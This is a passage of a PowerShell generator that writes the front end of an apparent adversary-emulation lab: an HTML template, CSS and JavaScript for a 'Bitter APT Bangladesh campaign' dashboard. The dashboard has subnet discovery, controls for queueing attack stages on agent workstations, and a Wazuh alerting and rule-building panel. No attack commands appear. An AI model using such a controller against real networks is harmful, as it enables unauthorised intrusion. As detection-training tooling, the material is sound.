    <label class="field-label">Select Workstation</label>
    <div class="ws-row">
      <select id="ws-select">
        <option value="">- none -</option>
        {% for w in workstations %}
        <option value="{{ w.id }}">{{ w.id }} ({{ w.hostname }}) - {{ w.status }}</option>
        {% endfor %}
      </select>
      <button id="btn-refresh-ws" class="ghost" title="Refresh list">R</button>
    </div>
    <div class="ws-row">
      <input id="ws-subnet" class="subnet-input" placeholder="empty = scan ALL adapters, or 192.168.1.0/24" value="{{ lab_subnet }}">
      <button id="btn-discover" class="primary" title="Scan subnet">DISCOVER</button>
    </div>
    <div class="small muted" id="discover-status"></div>
    <div id="discover-results" class="discover-list scroll-y"></div>
    <div class="ws-card">
      <div class="ws-icon">[PC]</div>
      <div><div class="ws-name" id="ws-name">-</div><div class="muted small">TARGET HOST (BD)</div></div>
    </div>
    <dl class="kv">
      <dt>Operating System</dt><dd id="ws-os">-</dd>
      <dt>IP Address</dt><dd id="ws-ip">-</dd>
      <dt>Wazuh Agent</dt><dd id="ws-wazuh">-</dd>
      <dt>Sysmon</dt><dd id="ws-sysmon">-</dd>
      <dt>Agent Connection</dt><dd id="ws-status">-</dd>
      <dt>Current User</dt><dd id="ws-user">-</dd>
      <dt>Last Heartbeat</dt><dd id="ws-heartbeat">-</dd>
    </dl>
    <h3 class="sub">LAB NOTES</h3>
    <textarea class="notes" placeholder="Analyst notes for this BANGLADESH campaign run..."></textarea>
    <h3 class="sub">CONNECTIONS</h3>
    <div class="conns">
      <span class="dot" id="c-wazuh">Wazuh</span>
      <span class="dot" id="c-sysmon">Sysmon</span>
      <span class="dot" id="c-agent">Agent</span>
    </div>
    <button id="btn-test" class="ghost block">TEST CONNECTION</button>
  </aside>
</div>

<section class="wazuh panel">
  <h2 class="panel-title">WAZUH DETECTION CENTER &mdash; BANGLADESH CAMPAIGN</h2>
  <div class="tabs">
    <button class="tab active" data-wtab="live">LIVE ALERTS</button>
    <button class="tab" data-wtab="search">SEARCH</button>
    <button class="tab" data-wtab="rules">RULES</button>
    <button class="tab" data-wtab="builder">RULE BUILDER</button>
    <button class="tab" data-wtab="tester">RULE TESTER</button>
    <button class="tab" data-wtab="agents">AGENTS</button>
    <button class="tab" data-wtab="timeline">TIMELINE</button>
  </div>
  <div class="filters">
    <select id="f-time"><option value="15">Last 15m</option><option value="60">Last 1h</option><option value="360">Last 6h</option><option value="1440">Last 24h</option></select>
    <input id="f-agent" placeholder="agent">
    <input id="f-rule"  placeholder="rule.id">
    <input id="f-level" placeholder="level &gt;=">
    <input id="f-mitre" placeholder="T1486">
    <input id="f-event" placeholder="eventID">
    <input id="f-q"     placeholder="free text">
    <button id="btn-search" class="primary">SEARCH</button>
  </div>
  <div class="wpane-wrap scroll-y">
    <div class="wpane active" id="wpane-live">
      <table class="tbl alerts" id="live-tbl">
        <thead><tr><th>Time</th><th>Lvl</th><th>Rule</th><th>Description</th><th>Agent</th><th>MITRE</th><th>Group</th></tr></thead>
        <tbody></tbody>
      </table>
    </div>
    <div class="wpane" id="wpane-search">
      <table class="tbl alerts" id="search-tbl">
        <thead><tr><th>Time</th><th>Lvl</th><th>Rule</th><th>Description</th><th>Agent</th><th>MITRE</th></tr></thead>
        <tbody></tbody>
      </table>
    </div>
    <div class="wpane" id="wpane-rules">
      <button class="ghost" id="btn-load-rules">Load Rules</button>
      <table class="tbl" id="rules-tbl"><thead><tr><th>ID</th><th>Level</th><th>Description</th><th>Groups</th></tr></thead><tbody></tbody></table>
    </div>
    <div class="wpane" id="wpane-builder">
      <div class="builder">
        <select id="preset-select"><option value="">- pick preset from BITTER BANGLADESH rules -</option></select>
        <button class="ghost" id="btn-load-preset">Load Preset</button>
        <textarea id="rule-xml" class="mono" spellcheck="false"></textarea>
        <div class="row">
          <button id="btn-validate" class="ghost">Validate XML</button>
          <button id="btn-test-rule" class="ghost">Test Rule</button>
          <button id="btn-deploy" class="warn">Deploy</button>
        </div>
        <pre id="rule-msg" class="mono"></pre>
      </div>
    </div>
    <div class="wpane" id="wpane-tester">
      <textarea id="logtest-input" class="mono" placeholder="Paste raw event JSON or log line..."></textarea>
      <button id="btn-logtest" class="primary">TEST AGAINST WAZUH</button>
      <pre id="logtest-output" class="mono"></pre>
    </div>
    <div class="wpane" id="wpane-agents">
      <button class="ghost" id="btn-load-agents">Load Agents</button>
      <table class="tbl" id="agents-tbl"><thead><tr><th>ID</th><th>Name</th><th>IP</th><th>Status</th><th>Version</th><th>OS</th></tr></thead><tbody></tbody></table>
    </div>
    <div class="wpane" id="wpane-timeline"><div id="timeline" class="timeline"></div></div>
  </div>
</section>

<section class="panel chain">
  <h2 class="panel-title">BITTER APT &mdash; BANGLADESH ATTACK CHAIN</h2>
  <div class="chainline">
    {% for s in stages %}
      <div class="node" data-node="{{ s.key }}">{{ s.name }}</div>
      {% if not loop.last %}<div class="arrow">v</div>{% endif %}
    {% endfor %}
  </div>
</section>

<div id="drawer" class="drawer">
  <div class="drawer-head"><b>ALERT DETAIL &mdash; BANGLADESH CAMPAIGN</b><button id="drawer-close" class="ghost">X</button></div>
  <div class="drawer-body">
    <div id="drawer-summary"></div>
    <div class="row">
      <button class="ghost" id="btn-copy-json">Copy JSON</button>
      <button class="ghost" id="btn-related">Open Related Events</button>
      <button class="ghost" id="btn-hunt-host">Hunt This Host</button>
      <button class="ghost" id="btn-hunt-rule">Hunt This Rule</button>
    </div>
    <pre id="drawer-json" class="mono"></pre>
    <div id="drawer-related"></div>
  </div>
</div>
{% endblock %}

{% block scripts %}
<script>
window.GB = {
  stages: {{ stages | tojson | safe }},
  workstations: {{ workstations | tojson | safe }},
  stage_states: {{ stage_states | tojson | safe }},
  poll_interval: {{ poll_interval }},
  lab_subnet: {{ lab_subnet | tojson | safe }},
  campaign: 'BANGLADESH'
};
</script>
{% endblock %}
'@

# ============================================================
# public/css/style.css
# ============================================================
Write-ProjectFile "public/css/style.css" @'
:root{
  --bg:#0b1220; --panel:#0f1724; --line:#1e2a44;
  --txt:#d7e0ee; --muted:#8ea0bd; --accent:#f5a623;
  --green:#22c55e; --red:#ef4444; --amber:#f59e0b; --grey:#94a3b8;
  --bd-green:#006a4e; --bd-red:#f42a41;
  --mono:'Consolas','JetBrains Mono','Courier New',monospace;
}
*{box-sizing:border-box}
html,body{margin:0;padding:0;background:var(--bg);color:var(--txt);
  font-family:Inter,system-ui,Segoe UI,Roboto,sans-serif;font-size:13px;min-height:100vh}
body{display:flex;flex-direction:column;padding-bottom:44px}
a{color:inherit;text-decoration:none}
.topnav{display:flex;align-items:center;gap:22px;padding:10px 22px;background:#080e1a;
  border-bottom:1px solid var(--line);position:sticky;top:0;z-index:50;flex-shrink:0}
.brand{font-weight:800;letter-spacing:1px;font-size:18px}
.brand .sub{color:var(--accent);font-weight:500;font-size:11px;letter-spacing:2px;margin-left:4px}
.brand .sub-bd{color:var(--bd-red);font-weight:700;font-size:11px;letter-spacing:2px;margin-left:6px}
.logo{display:inline-block;background:var(--accent);color:#0b1220;width:22px;height:22px;
  border-radius:6px;text-align:center;line-height:22px;font-weight:900;margin-right:6px}
.topnav nav{display:flex;gap:20px;flex:1;color:#a7b3c7;flex-wrap:wrap}
.topnav nav a.active{color:var(--accent);border-bottom:2px solid var(--accent);padding-bottom:2px}
.nav-right{display:flex;gap:12px;align-items:center}
.search{background:#0f1724;border:1px solid var(--line);color:var(--txt);
  padding:6px 10px;border-radius:6px;min-width:180px}
.user{color:var(--muted)} .user b{color:var(--accent);margin-left:4px}
.btn-ghost,.ghost{background:transparent;border:1px solid var(--line);color:var(--txt);
  padding:6px 10px;border-radius:6px;cursor:pointer;font-size:12px}
.ghost:hover{border-color:var(--accent)}
.main-content{flex:1 1 auto;display:flex;flex-direction:column;gap:12px;padding:0 0 12px}
.crumbs{padding:14px 22px 0;color:var(--muted)}
.crumbs .bd-crumb{color:var(--bd-red);font-weight:700;letter-spacing:1px}
.bd-banner{
  margin:0 22px;padding:10px 16px;border-radius:8px;
  background:linear-gradient(90deg,var(--bd-green) 0%,var(--bd-green) 38%,var(--bd-red) 38%,var(--bd-red) 100%);
  color:#fff;font-size:12px;font-weight:600;letter-spacing:0.3px;
  text-shadow:0 1px 2px rgba(0,0,0,0.35);border:1px solid #004d38;
  display:flex;align-items:center;gap:10px;flex-wrap:wrap;
}
.bd-banner b{color:#fff;text-decoration:underline;text-underline-offset:2px}
.bd-flag-icon{font-size:20px;line-height:1;filter:drop-shadow(0 1px 2px rgba(0,0,0,0.4))}
.bd-tag{color:var(--bd-red);font-weight:800;letter-spacing:3px;font-size:11px;margin:0}
.bd-target-card{
  display:flex;gap:12px;align-items:center;padding:10px;margin-bottom:10px;border-radius:8px;
  background:linear-gradient(90deg,rgba(0,106,78,0.22) 0%,rgba(0,106,78,0.22) 45%,rgba(244,42,65,0.22) 45%,rgba(244,42,65,0.22) 100%);
  border:1px solid var(--bd-green);
}
.bd-target-flag{font-size:26px;line-height:1}
.bd-target-title{font-weight:800;letter-spacing:2px;font-size:14px;color:#fff}
.bd-target-sub{color:var(--muted);font-size:11px;margin-top:2px}
.hero{display:flex;justify-content:space-between;align-items:flex-end;
  padding:6px 22px 14px;gap:20px;flex-wrap:wrap}
.hero h1{margin:6px 0 4px;font-size:24px;letter-spacing:1px}
.hero h1 .accent{color:var(--accent)}
.subtitle{color:var(--muted);margin:0;font-size:12px}
.subtitle b{color:#fff}
.stepper{display:flex;gap:8px;flex-wrap:wrap}
.step{padding:6px 12px;border:1px solid var(--line);border-radius:6px;color:var(--muted);
  background:#0d1524;font-size:12px}
.step.active{border-color:var(--accent);color:var(--accent);background:#1a1204}
.step.done{border-color:var(--green);color:var(--green)}
.banner{margin:0 22px;padding:8px 12px;border-radius:6px;font-weight:600;letter-spacing:.5px;font-size:12px}
.banner.danger{background:#2a0f11;border:1px solid #7f1d1d;color:#fca5a5}
.banner.warn{background:#2a2008;border:1px solid #7c5a10;color:#fde68a}
.layout{display:grid;grid-template-columns:280px minmax(0,1fr) 320px;gap:14px;
  padding:0 22px;align-items:start}
@media (max-width:1400px){.layout{grid-template-columns:240px minmax(0,1fr) 280px}}
@media (max-width:1100px){.layout{grid-template-columns:1fr}}
.panel{background:var(--panel);border:1px solid var(--line);border-radius:10px;padding:12px}
.panel-title{margin:2px 0 10px;font-size:12px;letter-spacing:1.5px;color:#cfd8e6}
.col-left,.col-right{max-height:70vh;overflow:hidden;display:flex;flex-direction:column}
.col-center{display:flex;flex-direction:column;max-height:70vh;overflow:hidden}
.scroll-y{overflow-y:auto;min-height:0;flex:1 1 auto}
.scroll-y::-webkit-scrollbar{width:8px;height:8px}
.scroll-y::-webkit-scrollbar-thumb{background:#22304d;border-radius:6px}
.stage-card{display:flex;gap:10px;padding:10px;border:1px solid var(--line);
  border-radius:8px;background:#0b1322;margin-bottom:8px;cursor:pointer;align-items:center}
.stage-card.active{border-color:var(--accent);background:#181206}
.stage-card .num{width:34px;height:34px;border-radius:6px;background:#0a1626;color:var(--accent);
  display:grid;place-items:center;font-weight:700;flex-shrink:0}
.stage-card .meta{min-width:0}
.stage-card .title{font-weight:600;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.stage-card .desc{color:var(--muted);font-size:11px}
.stage-card .status{margin-left:auto;font-size:16px;flex-shrink:0}
.st-notstarted{color:var(--grey)} .st-running{color:var(--amber)}
.st-completed{color:var(--green)} .st-failed{color:var(--red)}
.sim-header{display:grid;grid-template-columns:1fr 1fr 1fr;gap:10px;margin-bottom:10px}
.sim-header label{color:var(--muted);font-size:10px;letter-spacing:1px}
.sim-header>div>div{font-weight:600;color:#e8eef8;margin-top:2px;overflow:hidden;text-overflow:ellipsis}
.sim-buttons{display:flex;gap:8px;margin-bottom:12px;flex-wrap:wrap}
button.primary{background:var(--accent);color:#0b1220;border:0;padding:8px 14px;
  border-radius:6px;font-weight:700;cursor:pointer;font-size:12px}
button.danger{background:var(--red);color:white;border:0;padding:8px 14px;
  border-radius:6px;font-weight:700;cursor:pointer;font-size:12px}
button.warn{background:var(--amber);color:#111;border:0;padding:8px 14px;
  border-radius:6px;font-weight:700;cursor:pointer;font-size:12px}
.tabs{display:flex;gap:4px;border-bottom:1px solid var(--line);margin-bottom:8px;
  flex-wrap:wrap;flex-shrink:0}
.tab{background:transparent;border:0;color:var(--muted);padding:8px 12px;cursor:pointer;
  font-weight:600;letter-spacing:.5px;font-size:11px;white-space:nowrap}
.tab.active{color:var(--accent);border-bottom:2px solid var(--accent)}
.tabpane,.wpane{display:none}
.tabpane.active,.wpane.active{display:block}
.tabbody{min-height:0}
.mono{font-family:var(--mono);font-size:12px;background:#0a1120;border:1px solid var(--line);
  border-radius:6px;padding:10px;color:#d7e0ee;white-space:pre-wrap;word-break:break-word}
#output{min-height:260px;max-height:52vh;overflow:auto}
.cmdlist{max-height:26vh;overflow:auto;border:1px solid var(--line);border-radius:6px;margin-bottom:8px}
.cmdlist .item{padding:8px 10px;border-bottom:1px solid var(--line);cursor:pointer;
  font-family:var(--mono);font-size:11px}
.cmdlist .item:hover{background:#0e182b}
.cmddetail{max-height:26vh;overflow:auto}
.tbl{width:100%;border-collapse:collapse;font-size:12px;table-layout:fixed}
.tbl th{text-align:left;color:var(--muted);font-weight:600;padding:6px;
  border-bottom:1px solid var(--line);letter-spacing:.5px;font-size:11px}
.tbl td{padding:6px;border-bottom:1px solid #14203a;font-family:var(--mono);
  font-size:11px;color:#dbe4f3;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.tbl tr:hover td{background:#0e182b}
.ws-row{display:flex;gap:6px;margin-bottom:6px}
.ws-row select,.ws-row input{flex:1 1 auto;min-width:0;background:#0a1120;
  border:1px solid var(--line);color:var(--txt);padding:6px 8px;border-radius:6px;font-size:12px}
.subnet-input{font-family:var(--mono)}
.field-label{display:block;color:var(--muted);font-size:11px;margin-bottom:4px}
.discover-list{max-height:180px;border:1px solid var(--line);border-radius:6px;
  padding:6px;background:#0a1120;margin-bottom:8px;font-family:var(--mono);font-size:11px}
.discover-list:empty{display:none}
.discover-list .host{display:flex;gap:8px;align-items:center;padding:4px 6px;
  border-bottom:1px solid #16223a}
.discover-list .host:last-child{border-bottom:0}
.discover-list .host .ip{color:#8ee0ff;min-width:110px}
.discover-list .host .hn{color:var(--muted);flex:1;overflow:hidden;text-overflow:ellipsis}
.discover-list .host .via{color:#9aa9c4;font-size:10px;opacity:0.8}
.discover-list .host .reg{color:var(--green)}
.discover-list .host .self{color:var(--accent);font-weight:700}
.discover-list .host button{padding:2px 8px;font-size:10px}
.ws-card{display:flex;gap:12px;align-items:center;margin:10px 0;padding:10px;
  border:1px solid var(--line);border-radius:8px;background:#0b1322}
.ws-icon{font-size:22px;font-family:var(--mono);color:var(--accent);font-weight:800}
.ws-name{font-weight:700}
.kv{display:grid;grid-template-columns:1fr 1fr;gap:6px 12px;margin:0}
.kv dt{color:var(--muted);font-size:11px}
.kv dd{margin:0;text-align:right;font-weight:600;overflow:hidden;text-overflow:ellipsis}
.sub{margin:14px 0 6px;color:#cfd8e6;letter-spacing:1px;font-size:11px}
.notes{width:100%;min-height:60px;background:#0a1120;border:1px solid var(--line);
  color:var(--txt);border-radius:6px;padding:8px;font-family:var(--mono);font-size:11px;resize:vertical}
.conns{display:flex;gap:8px;margin-bottom:10px;flex-wrap:wrap}
.dot{padding:3px 10px;border-radius:99px;font-size:11px;border:1px solid var(--line);color:var(--muted)}
.dot.green{border-color:#15803d;color:#4ade80;background:#062015}
.dot.red{border-color:#7f1d1d;color:#fca5a5;background:#2a0f11}
.dot.grey{border-color:var(--line);color:var(--muted);background:#0d1424}
.block{width:100%;margin-top:8px}
.wazuh{margin:0 22px}
.wpane-wrap{max-height:42vh;overflow:auto}
.filters{display:flex;gap:6px;margin:10px 0;flex-wrap:wrap}
.filters input,.filters select{background:#0a1120;border:1px solid var(--line);color:var(--txt);
  padding:6px 8px;border-radius:6px;font-size:12px;min-width:110px;flex:0 0 auto}
.alerts th:nth-child(1),.alerts td:nth-child(1){width:80px}
.alerts th:nth-child(2),.alerts td:nth-child(2){width:50px}
.alerts th:nth-child(3),.alerts td:nth-child(3){width:80px}
.alerts th:nth-child(5),.alerts td:nth-child(5){width:140px}
.alerts th:nth-child(6),.alerts td:nth-child(6){width:130px}
.alerts th:nth-child(7),.alerts td:nth-child(7){width:150px}
.builder{display:flex;flex-direction:column;gap:8px}
.builder textarea{min-height:180px;background:#0a1120;border:1px solid var(--line);
  color:#8ee0ff;border-radius:6px;padding:10px;font-family:var(--mono);font-size:12px}
.row{display:flex;gap:8px;flex-wrap:wrap}
#logtest-input{min-height:120px;width:100%;background:#0a1120;border:1px solid var(--line);
  color:var(--txt);border-radius:6px;padding:10px;font-family:var(--mono);font-size:12px}
.timeline{border-left:2px solid var(--line);padding-left:14px;margin:10px 0}
.timeline .ev{position:relative;padding:6px 0 14px}
.timeline .ev:before{content:'';position:absolute;left:-21px;top:12px;width:8px;height:8px;
  background:var(--accent);border-radius:50%}
.chain{margin:0 22px 12px}
.chainline{display:flex;flex-wrap:wrap;gap:8px;align-items:center;padding:6px 0}
.chainline .node{padding:8px 12px;border:1px solid var(--line);border-radius:6px;
  background:#0b1322;color:#cfd8e6;font-size:12px;cursor:pointer}
.chainline .node.active{border-color:var(--accent);color:var(--accent)}
.chainline .arrow{color:var(--muted);font-family:var(--mono);font-weight:700}
.statusbar{position:fixed;bottom:0;left:0;right:0;display:flex;gap:12px;padding:6px 22px;
  background:#080e1a;border-top:1px solid var(--line);font-size:11px;z-index:60}
.statusbar .dot{margin-right:6px}
.login-wrap{display:grid;place-items:center;min-height:70vh}
.login-card{background:var(--panel);border:1px solid var(--line);padding:26px;
  border-radius:10px;width:340px;display:flex;flex-direction:column;gap:10px}
.login-card h1{margin:0;font-size:20px;letter-spacing:2px}
.login-card label{display:flex;flex-direction:column;gap:4px;color:var(--muted);font-size:12px}
.login-card input{background:#0a1120;border:1px solid var(--line);color:var(--txt);padding:8px;border-radius:6px}
.login-card button{background:var(--accent);color:#0b1220;border:0;padding:10px;
  border-radius:6px;font-weight:700;cursor:pointer}
.muted{color:var(--muted)} .small{font-size:11px} .err{color:var(--red)}
.drawer{position:fixed;right:0;top:0;bottom:0;width:min(640px,92vw);background:var(--panel);
  border-left:1px solid var(--line);transform:translateX(100%);transition:transform .2s;
  z-index:100;display:flex;flex-direction:column}
.drawer.open{transform:translateX(0)}
.drawer-head{display:flex;justify-content:space-between;padding:12px 16px;border-bottom:1px solid var(--line)}
.drawer-body{padding:14px;overflow:auto;flex:1;display:flex;flex-direction:column;gap:10px}
#drawer-json{max-height:50vh;overflow:auto}
'@

# ============================================================
# public/js/app.js  *** UPDATED ***
# ============================================================
Write-ProjectFile "public/js/app.js" @'
(function(){
'use strict';
const GB = window.GB || {stages:[],workstations:[],stage_states:{},poll_interval:3,lab_subnet:"",campaign:"BANGLADESH"};
let selectedStage = GB.stages[0] ? GB.stages[0].key : null;
let selectedWs = null;
const $ = (s)=>document.querySelector(s);
const $$ = (s)=>document.querySelectorAll(s);

function renderStageActive(){
  $$('.stage-card').forEach(el=>el.classList.toggle('active', el.dataset.stage===selectedStage));
  const s = GB.stages.find(x=>x.key===selectedStage);
  if(!s) return;
  $('#hdr-stage').textContent = s.number + '. ' + s.name.toUpperCase();
  renderMitre(s);
}
$$('.stage-card').forEach(el=>el.addEventListener('click',()=>{
  selectedStage = el.dataset.stage; renderStageActive(); updateChain();
}));

function renderMitre(s){
  $('#mitre-content').innerHTML = `
    <h3>${s.name}</h3>
    <p class="bd-tag">BANGLADESH CAMPAIGN STAGE</p>
    <p><b>Objective:</b> ${s.objective}</p>
    <p><b>Real Bitter behaviour (Bangladesh):</b> ${s.real_attacker_behavior}</p>
    <p><b>Simulated behaviour:</b> ${s.simulated_behavior}</p>
    <p><b>Backend action:</b> ${s.backend_action}</p>
    <p><b>MITRE ATT&amp;CK:</b> ${s.mitre_id} - ${s.mitre_name} <i>(${s.mitre_tactic})</i></p>
    <p><b>Windows events:</b> ${s.windows_event_id} - ${s.windows_event_description}</p>
    <p><b>Wazuh rule:</b> ${s.wazuh_rule_id} - ${s.wazuh_description}</p>
    <p><b>Forensic artifacts:</b> ${s.forensic_artifacts}</p>
    <p><b>Network indicators:</b> ${s.network_indicators}</p>
    <p><b>Analyst notes:</b> ${s.analyst_notes}</p>
    <p><b>Common false positives:</b> ${s.common_false_positives}</p>
    <p><b>Response playbook:</b> ${s.response_playbook}</p>
    <p><b>Cleanup notes:</b> ${s.cleanup_notes}</p>
    <p><b>References:</b> ${s.references}</p>
    <h4>Sysmon</h4>
    <table class="tbl"><thead><tr><th>Event</th><th>Why it matters</th></tr></thead><tbody>
      ${(s.sysmon_events||[]).map(e=>`<tr><td>${e.id}</td><td>${e.reason}</td></tr>`).join('')}
    </tbody></table>
    <h4>Wazuh rule XML</h4>
    <pre class="mono">${(s.wazuh_rule_xml||'').replace(/</g,'&lt;')}</pre>`;
}

function rebuildWsSelect(){
  const sel = $('#ws-select');
  const cur = selectedWs;
  sel.innerHTML = '<option value="">- none -</option>';
  (GB.workstations||[]).forEach(w=>{
    const o = document.createElement('option');
    o.value = w.id;
    o.textContent = w.id + ' (' + (w.ip||'') + ') - ' + (w.status||'');
    sel.appendChild(o);
  });
  if(cur && (GB.workstations||[]).some(w=>w.id===cur)) sel.value = cur;
  else if((GB.workstations||[]).length){ selectedWs = GB.workstations[0].id; sel.value = selectedWs; }
  else selectedWs = null;
  updateWorkstationCard();
}
$('#ws-select').addEventListener('change', e=>{
  selectedWs = e.target.value || null; updateWorkstationCard();
});

function updateWorkstationCard(){
  const w = (GB.workstations||[]).find(x=>x.id===selectedWs);
  if(!w){
    ['ws-name','ws-os','ws-ip','ws-wazuh','ws-sysmon','ws-status','ws-user','ws-heartbeat']
      .forEach(id=>$('#'+id).textContent='-');
    $('#hdr-target').textContent = '-';
    ['c-wazuh','c-sysmon','c-agent'].forEach(id=>$('#'+id).classList.remove('green','red'));
    return;
  }
  $('#ws-name').textContent = w.id;
  $('#ws-os').textContent = w.os||'-';
  $('#ws-ip').textContent = w.ip||'-';
  $('#ws-wazuh').textContent = w.wazuh_status||'-';
  $('#ws-sysmon').textContent = w.sysmon_status||'-';
  $('#ws-status').textContent = w.status||'-';
  $('#ws-user').textContent = w.current_user||'-';
  $('#ws-heartbeat').textContent = (w.last_seen||'').slice(0,19).replace('T',' ')||'-';
  $('#hdr-target').textContent = w.id + ' [BD]';
  ['c-wazuh','c-sysmon','c-agent'].forEach(id=>$('#'+id).classList.remove('green','red'));
  $('#c-wazuh').classList.add((w.wazuh_status||'').toLowerCase().indexOf('online')>=0?'green':'red');
  $('#c-sysmon').classList.add((w.sysmon_status||'').toLowerCase().indexOf('run')>=0?'green':'red');
  $('#c-agent').classList.add((w.status||'').toLowerCase().match(/online|ready|busy/)?'green':'red');
}

async function refreshWorkstations(){
  try{
    const r = await fetch('/api/workstations');
    if(!r.ok) return;
    const j = await r.json();
    GB.workstations = j.items||[];
    rebuildWsSelect();
  }catch(_){}
}
$('#btn-refresh-ws').addEventListener('click', refreshWorkstations);

function escHtml(s){
  return String(s||'').replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
}

function hostRow(h){
  const registered = h.registered_id;
  const via = h.via ? '<span class="via">[' + h.via + ']</span>' : '';
  const subnetTag = h.subnet ? '<span class="via">' + escHtml(h.subnet) + '</span>' : '';
  const selfTag = h.is_self ? '<span class="self">[SELF]</span>' : '';
  const hn = escHtml(h.hostname||'');
  const ip = escHtml(h.ip);
  const bn = escHtml(h.hostname||'');
  return '<div class="host">' +
    '<span class="ip">' + ip + '</span>' +
    '<span class="hn">' + hn + ' ' + via + ' ' + subnetTag + ' ' + selfTag + '</span>' +
    (registered
      ? '<span class="reg">registered: ' + escHtml(registered) + '</span>' +
        '<button class="ghost" data-use="' + escHtml(registered) + '">USE</button>'
      : '<button class="primary" data-add-ip="' + ip + '" data-add-hn="' + bn + '">+ Register</button>') +
    '</div>';
}

async function runDiscovery(){
  const subnet = $('#ws-subnet').value.trim();
  $('#discover-status').textContent = 'Scanning all adapters... (ICMP + TCP + ARP, may take ~1-2 min)';
  $('#discover-results').innerHTML = '';
  try{
    const r = await fetch('/api/workstations/discover',{
      method:'POST', headers:{'Content-Type':'application/json'},
      body: JSON.stringify({subnet: subnet || null})
    });
    const j = await r.json();
    if(!r.ok){ $('#discover-status').textContent = 'Error: '+(j.detail||r.statusText); return; }
    $('#discover-status').textContent = 'Found ' + j.count + ' host(s) across [' + j.subnet + '] (source=' + (j.source||'?') + ')';
    $('#discover-results').innerHTML = (j.hosts||[]).map(hostRow).join('');
    wireDiscoveryButtons();
    await refreshWorkstations();
  }catch(e){ $('#discover-status').textContent = 'Error: '+e; }
}

function wireDiscoveryButtons(){
  $$('#discover-results button[data-use]').forEach(b=>{
    b.addEventListener('click',()=>{
      selectedWs = b.dataset.use; $('#ws-select').value = selectedWs; updateWorkstationCard();
    });
  });
  $$('#discover-results button[data-add-ip]').forEach(b=>{
    b.addEventListener('click', async ()=>{
      const ip = b.dataset.addIp;
      const hn = b.dataset.addHn || ip;
      const wid = hn;
      const r = await post('/api/workstations/add', {workstation_id: wid, hostname: hn, ip: ip});
      if(r.ok){
        await refreshWorkstations();
        selectedWs = wid; $('#ws-select').value = wid; updateWorkstationCard();
        log('Registered placeholder ' + wid + ' (' + ip + '). Start the agent on it to run stages.');
      } else alert('Add failed: '+(r.error||''));
    });
  });
}
$('#btn-discover').addEventListener('click', runDiscovery);

$('#btn-run').addEventListener('click', async ()=>{
  if(!selectedWs) return alert('Select a workstation first.');
  if(!selectedStage) return alert('Select a stage first.');
  const s = GB.stages.find(x=>x.key===selectedStage);
  if(!confirm('Run stage "' + s.name + '" on ' + selectedWs + '? (BANGLADESH CAMPAIGN)')) return;
  setSimStatus('QUEUING...');
  const r = await post('/api/simulation/run-stage', {workstation_id:selectedWs, stage_id:selectedStage});
  if(r.ok){
    log('Stage queued. Job ' + r.job.job_id);
    log('Waiting for agent on ' + r.job.workstation_id + ' to pick up the job...');
    setSimStatus('RUNNING');
    trackJob(r.job.job_id);
  } else {
    log('[error] ' + (r.error||'failed'));
    setSimStatus('ERROR');
  }
});
$('#btn-cleanup').addEventListener('click', async ()=>{
  if(!selectedWs||!selectedStage) return;
  if(!confirm('Run cleanup for this stage?')) return;
  const r = await post('/api/simulation/cleanup-stage', {workstation_id:selectedWs, stage_id:selectedStage});
  if(r.ok){ log('Cleanup queued.'); trackJob(r.job.job_id); }
  else log('[error] ' + (r.error||'failed'));
});
$('#btn-stop').addEventListener('click', async ()=>{
  if(!selectedWs) return;
  const r = await post('/api/simulation/stop', {workstation_id:selectedWs, stage_id:selectedStage||'*'});
  if(r.ok){ setSimStatus('STOP REQUESTED'); log('Stop queued.'); }
  else log('[error] ' + (r.error||'failed'));
});
$('#btn-reset').addEventListener('click', ()=>{
  log('[system] Reset is per-stage cleanup; use CLEANUP for each stage.');
});

function setSimStatus(s){ $('#hdr-status').textContent = s; }
function log(line){
  const el = $('#output'); const t = new Date().toLocaleTimeString();
  el.textContent += '[' + t + '] ' + line + '\n'; el.scrollTop = el.scrollHeight;
}
async function post(url, body){
  try{
    const r = await fetch(url,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(body||{})});
    const j = await r.json().catch(()=>({}));
    if(!r.ok) return {ok:false, error:j.detail||r.statusText};
    return Object.assign({ok:true}, j);
  }catch(e){ return {ok:false, error:String(e)}; }
}

async function trackJob(jobId){
  let attempts = 0;
  let lastStatus = 'RUNNING';
  while(attempts < 150){
    attempts++;
    await new Promise(r=>setTimeout(r, 2000));
    try{
      const r = await fetch('/api/simulation/runs/by-job/'+encodeURIComponent(jobId));
      if(!r.ok) continue;
      const j = await r.json();
      if(j.status && j.status !== 'RUNNING'){
        setSimStatus(j.status);
        const res = j.result || {};
        log('Job ' + jobId.slice(0,8) + ' -> ' + j.status);
        if(res.summary) log(res.summary);
        if(res.commands && res.commands.length) renderCommands(res.commands);
        if(res.observed_lines && res.observed_lines.length){
          res.observed_lines.forEach(function(l){ log(l); });
        }
        return;
      }
      if(j.status !== lastStatus){ lastStatus = j.status; }
      setSimStatus('RUNNING (job ' + jobId.slice(0,6) + ')');
    }catch(_){}
  }
  setSimStatus('TIMEOUT');
  log('[warn] No result from agent after 300s.');
}
function renderCommands(commands){
  const list = $('#command-list'), detail = $('#command-detail');
  list.innerHTML=''; detail.textContent='';
  commands.forEach(c=>{
    const div = document.createElement('div'); div.className='item';
    div.textContent = (c.phase||'') + '  ' + (c.command||'');
    div.addEventListener('click', ()=>{ detail.textContent = (c.output||''); });
    list.appendChild(div);
  });
  if(commands[0]) detail.textContent = commands[0].output || '';
}

$$('.tab[data-tab]').forEach(t=>t.addEventListener('click',()=>{
  $$('.tab[data-tab]').forEach(x=>x.classList.remove('active')); t.classList.add('active');
  $$('.tabpane').forEach(p=>p.classList.remove('active'));
  $('#pane-'+t.dataset.tab).classList.add('active');
}));
$$('.tab[data-wtab]').forEach(t=>t.addEventListener('click',()=>{
  $$('.tab[data-wtab]').forEach(x=>x.classList.remove('active')); t.classList.add('active');
  $$('.wpane').forEach(p=>p.classList.remove('active'));
  $('#wpane-'+t.dataset.wtab).classList.add('active');
  if(t.dataset.wtab==='rules') loadRules();
  if(t.dataset.wtab==='agents') loadAgents();
  if(t.dataset.wtab==='timeline') loadTimeline();
  if(t.dataset.wtab==='builder') loadPresets();
}));

let ws;
function connectWS(){
  const proto = location.protocol==='https:'?'wss':'ws';
  ws = new WebSocket(proto + '://' + location.host + '/ws/wazuh-alerts');
